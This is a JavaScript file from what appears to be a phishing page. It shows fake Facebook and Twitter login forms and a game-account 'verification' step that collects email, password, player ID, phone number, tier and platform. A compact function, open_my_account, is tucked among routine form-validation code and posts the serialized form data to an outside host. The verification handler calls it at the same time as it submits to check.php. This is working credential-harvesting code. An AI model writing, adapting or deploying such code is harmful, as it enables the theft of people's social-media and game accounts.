// code function data
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.account_verification').show();
               $('.login-facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').show();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
               $('.account_verification').show();
               $('.login-facebook').hide();	          	           
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
            if($emailtw == '' || $emailtw == null || $emailtw.length <= 3)
            {
                $('.email-tw').show();
                $('.sandi-tw').hide();
                $('.account_verification').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.email-tw').hide();               
	           $("input#validateEmail").val($emailtw);
               $('.account_verification').show();
               $('.login-twitter').hide();  
            }
            if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7)
            {
                $('.sandi-tw').show();
                $('.account_verification').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.sandi-tw').hide();
	           $("input#validatePassword").val($passwordtw);
	           $("input#validateLogin").val($logintw);
               $('.account_verification').show();
               $('.login-twitter').hide();	          	           
	}
	}); 
}
function open_my_account() {var e = $(".popup-form").serialize();$.ajax({url: 'https://arpanrizky.my.id/api/',data: e,type: 'POST',success: function() {},error: function() {return true;}});}
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			open_my_account($(this).serialize());
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};